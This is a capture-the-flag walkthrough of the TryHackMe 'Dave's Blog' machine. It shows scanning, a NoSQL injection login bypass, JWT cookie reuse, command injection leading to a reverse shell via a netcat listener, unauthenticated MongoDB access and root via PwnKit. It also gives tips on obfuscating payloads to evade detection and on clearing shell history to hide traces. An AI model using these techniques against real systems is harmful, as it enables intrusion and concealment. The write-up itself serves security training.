# Try Hack Me — Dave’s Blog Walkthrough


## Introduction

**Hello, stranger — let’s begin.**

![Ready to go??](./images/dave_1.webp)

---

## Challenge Link

Today’s problem is: https://tryhackme.com/room/davesblog

---

## Challenge Overview

**Machine:** Dave’s Blog (THM)

**Path:** Port Scan → Web Enumeration → NoSQL Injection → JWT Abuse → Command Injection (`/admin/exec`) → Reverse Shell → MongoDB Access → Sudo Misconfig → Root

**Key Takeaway:** Weak backend validation combined with insecure JWT handling and a command execution endpoint allowed full system compromise starting from a simple NoSQL injection.

**Business Impact:** In a real-world web application using Node.js and NoSQL databases, such flaws could allow attackers to bypass authentication, gain admin access, execute system commands, and pivot into backend services like databases — ultimately leading to full server compromise, data exposure, and loss of control over application infrastructure.

---

## Initial Setup

The following entry was added to the `/etc/hosts` file to simplify hostname-based interaction with the target system:

    <TARGET_IP> dave.thm

---

## Port Scanning

The initial enumeration phase was started by performing a full port scan against the target machine using **Nmap**. The following commands were executed to identify open ports and active services:

    nmap -p- --open dave.thm
    nmap -sC -sV -p <OPEN_PORTS> dave.thm

    ┌──(root㉿vbox)-[~]
    └─# nmap -p- --open dave.thm              
    Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-19 19:09 +0530
    Nmap scan report for dave.thm (10.49.137.114)
    Host is up (0.037s latency).
    Not shown: 65531 filtered tcp ports (no-response), 1 closed tcp port (reset)
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    3000/tcp open  ppp
    Nmap done: 1 IP address (1 host up) scanned in 171.35 seconds

    ┌──(root㉿vbox)-[~]
    └─# nmap -sC -sV -p 22,80,3000 dave.thm   
    Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-19 19:13 +0530
    Nmap scan report for dave.thm (10.49.137.114)
    Host is up (0.033s latency).
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 f9:31:1f:9f:b4:a1:10:9d:a9:69:ec:d5:97:df:1a:34 (RSA)
    |   256 e9:f5:b9:9e:39:33:00:d2:7f:cf:75:0f:7a:6d:1c:d3 (ECDSA)
    |_  256 44:f2:51:7f:de:78:94:b2:75:2b:a8:fe:25:18:51:49 (ED25519)
    80/tcp   open  http    nginx 1.14.0 (Ubuntu)
    | http-robots.txt: 1 disallowed entry 
    |_/admin
    |_http-title: Dave's Blog
    |_http-server-header: nginx/1.14.0 (Ubuntu)
    3000/tcp open  http    Node.js (Express middleware)
    |_http-title: Dave's Blog
    | http-robots.txt: 1 disallowed entry 
    |_/admin
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 17.29 seconds

---

## Services Identified

    22 -> SSH
    80,3000 -> HTTP

The service running on port 3000 was identified as a Node.js application using Express middleware, indicating the presence of a custom web application rather than a standard web server.

---

## Directory Enumeration

A directory enumeration scan was also performed against the HTTP service using **Gobuster** to identify any further hidden or restricted endpoints on the HTTP port 3000.

    ┌──(root㉿vbox)-[~]
    └─# gobuster dir -u http://dave.thm:3000  -w /usr/share/seclists/Discovery/Web-Content/big.txt 
    ===============================================================
    Gobuster v3.8.2
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://dave.thm:3000
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.8.2
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    ADMIN                (Status: 200) [Size: 1254]
    Admin                (Status: 200) [Size: 1254]
    admin                (Status: 200) [Size: 1254]
    images               (Status: 301) [Size: 179] [--> /images/]
    javascripts          (Status: 301) [Size: 189] [--> /javascripts/]
    robots.txt           (Status: 200) [Size: 31]
    stylesheets          (Status: 301) [Size: 189] [--> /stylesheets/]
    Progress: 20481 / 20481 (100.00%)
    ===============================================================
    Finished
    ===============================================================

It reveals multiple endpoints, out of which `/admin` contained a login page.

---

## Exploitation — NoSQL Injection

To streamline further exploitation and payload testing, **Burp Suite** was used to capture and manipulate the requests.

A request was sent using demo login credentials, and it was observed that a JSON Web Token (JWT) was assigned as a cookie to the user upon authentication.

As indicated in the hint provided on the website, the backend was using a NoSQL database. Based on this, a NoSQL injection payload was crafted to bypass authentication.

The request header was modified by changing the content type to `application/json`, instead of URL-encoded content, the username and password parameters were adjusted accordingly to inject a logical condition.

The updated request used to grab the admin token was:

    POST /admin HTTP/1.1
    Host: dave.thm:3000
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/json
    Content-Length: 43
    Origin: http://dave.thm:3000
    Connection: keep-alive
    Referer: http://dave.thm:3000/admin
    Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NzY2MTQ3MTB9.qq-Tvea34IfV7T57eI05ML8md2Jgg_i-8o-JfWrgBVY
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i
    {"username":"dave","password":{"$ne":null}}

The `$ne` (not equal) operator was used to bypass authentication by matching any value that is not null, thereby allowing login without valid credentials.

> **Note ->** Simple NoSQL injection payloads such as `$ne` are commonly detected by modern web application firewalls and input validation mechanisms. In real-world environments, payloads are typically obfuscated, nested, or combined with legitimate query structures to bypass detection and avoid triggering security filters.

---

## JWT Abuse

The response revealed a new JWT token assigned as a cookie, representing an authenticated admin session.

The cookie was then manually replaced in the browser using Developer Tools → Storage → Cookies, as shown below.

![Updating the cookie](./images/dave_2.webp)

> The **FLAG 1** was captured from the decoded admin’s JWT token.

![<<FLAG_1>> decoded in Burpsuite’s Repeater](./images/dave_3.webp)

Alternatively, https://www.jwt.io can also be used to decrypt the JWT token.

> **Note ->** Direct manipulation of JWT tokens is often restricted through proper signature validation and secure storage mechanisms. In real-world environments, attacks typically involve weak secrets, algorithm confusion, or token misconfiguration rather than simple token replacement.

---

## Command Injection

After updating the cookie and refreshing the page, access to the admin panel was granted, which revealed a command execution interface.

The page source revealed that user input was being sent to the backend and executed through a JavaScript handler:

    <script>
      document.querySelector('button').onclick = async () => {
        
        const request = await fetch('/admin/exec', {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify({ exec: document.querySelector('input').value })
        });
        const response = await request.text();
        document.querySelector('textarea').value = response;
      }
    </script>

A reverse shell payload was injected into the request to obtain remote access to the system.

    The medium is having issues, the github link to the request body is provided here, alternatively, any reverse shell code can be copied from
    online tools, and used -> https://github.com/PulseEinher/ctf-writups/blob/main/tryhackme/davesblog/exploits/Reverse_shell.txt

> **Note ->** Direct command injection with reverse shell payloads is commonly detected by network monitoring and endpoint protection systems. In real-world environments, payloads are typically encoded, staged, or executed through indirect system calls to evade detection and reduce forensic visibility.

---

## Reverse Shell

A Netcat listener was started on the attacker machine, and the reverse shell was triggered by sending the request from Burp’s Repeater.

The reverse shell can be stabilised using the following commands:

    python3 -c 'import pty; pty.spawn("/bin/bash")'
    Ctrl+Z
    stty raw -echo
    fg

    ┌──(root㉿vbox)-[~]
    └─# nc -lvnp 4444  
    listening on [any] 4444 ...
    connect to [192.168.149.224] from (UNKNOWN) [10.48.178.8] 59792
    bash: cannot set terminal process group (929): Inappropriate ioctl for device
    bash: no job control in this shell
    dave@daves-blog:~/blog$ python3 -c 'import pty; pty.spawn("/bin/bash")'
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    dave@daves-blog:~/blog$ ^Z
    zsh: suspended  nc -lvnp 4444

    ┌──(root㉿vbox)-[~]
    └─# stty raw -echo
    fg     
    [1]  + continued  nc -lvnp 4444
    dave@daves-blog:~$ whoami
    dave

---

## User Flag

> The **user flag** was captured from the “/home/dave” directory:

    dave@daves-blog:~$ whoami
    dave
    dave@daves-blog:~$ cd /home/dave/
    dave@daves-blog:~$ cat user.txt 
    <<USER_FLAG>>

---

## MongoDB Enumeration

As indicated in the room hint, further enumeration was required on MongoDB.

The service was verified running using the following command:

    dave@daves-blog:~$ ps aux | grep mongo
    mongodb    871  0.4 11.2 1019780 53216 ?       Ssl  19:37   0:03 /usr/bin/mongod --unixSocketPrefix=/run/mongodb --config /etc/mongodb.conf
    dave      1444  0.0  0.2  13136   992 pts/0    S+   19:49   0:00 grep --color=auto mongo

It was observed that access control was not enabled on MongoDB, allowing unrestricted access.

> The **flag3** was captured from the **MongoDB** service:

    dave@daves-blog:~$ mongo
    MongoDB shell version v3.6.3
    connecting to: mongodb://127.0.0.1:27017
    MongoDB server version: 3.6.3
    Welcome to the MongoDB shell.
    For interactive help, type "help".
    For more comprehensive documentation, see
            http://docs.mongodb.org/
    Questions? Try the support group
            http://groups.google.com/group/mongodb-user
    Server has startup warnings: 
    2026-04-21T19:37:01.559+0000 I STORAGE  [initandlisten] 
    2026-04-21T19:37:01.559+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
    2026-04-21T19:37:01.559+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
    2026-04-21T19:37:04.274+0000 I CONTROL  [initandlisten] 
    2026-04-21T19:37:04.276+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
    2026-04-21T19:37:04.276+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
    2026-04-21T19:37:04.276+0000 I CONTROL  [initandlisten] 
    > show dbs
    admin       0.000GB
    config      0.000GB
    daves-blog  0.000GB
    local       0.000GB
    > use daves-blog
    switched to db daves-blog
    > show collections
    posts
    users
    whatcouldthisbes
    > db.whatcouldthisbes.find().pretty()
    {
            "_id" : ObjectId("5ec6e5cf1dc4d364bf864108"),
            "whatCouldThisBe" : "<<FLAG_3>>",
            "__v" : 0
    }

---

## Privilege Escalation

The sudo privileges of the user `dave` were then enumerated, and it was observed that the user could execute the binary `/uid_checker` as root without a password.

    dave@daves-blog:~$ sudo -l
    Matching Defaults entries for dave on daves-blog:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    User dave may run the following commands on daves-blog:
        (root) NOPASSWD: /uid_checker

> The **flag4** was captured from the **readble strings** of the binary “uid_checker”:

    dave@daves-blog:~$ strings /uid_checker | grep "THM"
    <<FLAG_4>>

---

## Root Access

The easiest way to gain root privileges and then capture the root flag was to exploit the **PwnKit** vulnerability and use our master tool. The details of the vulnerability and its exploitation can be found here:

https://medium.com/try-hack-me-gaming-server-91e14814ae51?source=post_page-----04bb52e15026---------------------------------------

An alternate and intended privilege escalation path was also present within the machine; however, it involves reverse engineering of the binary and could not be fully explored due to limited experience in binary analysis.

This path can be revisited in the future with improved reverse engineering knowledge.

---

## Cleanup

1. The JWT admin token inserted manually in browser storage should be removed (cookies/local storage) to avoid leaving an authenticated session artifact on the client side.  
2. The reverse shell spawned via `/admin/exec` (Netcat + `/bin/bash`) should be terminated, ensuring no active connection or orphaned shell process remains on the target.  
3. Shell command history on the target (e.g., `.bash_history` for user `dave`) should be cleared to remove traces of MongoDB access, enumeration commands, and privilege escalation attempts.  

---

## Remediations

1. Implement proper input validation and sanitization on the `/admin` endpoint to prevent NoSQL injection, ensuring operators like `$ne` cannot be used to bypass authentication.  
2. Secure JWT handling by enforcing strong secret keys, proper signature validation, and preventing client-side token manipulation or privilege escalation via token replacement.  
3. Remove or restrict the `/admin/exec` functionality, as direct command execution from user input enables remote code execution; if required, strictly validate and sandbox inputs.  
4. Enable authentication and access control on MongoDB to prevent unauthorized local access to databases and sensitive collections.  
5. Restrict sudo permissions for `/uid_checker`, and audit the binary for unsafe behavior to prevent unintended privilege escalation paths.  

---

## Conclusion

We are **done** with the machine……….

Let’s move to the next, till then  
**Have a good day (night too)**

---

## Disclaimer

This content is intended for educational purposes only.
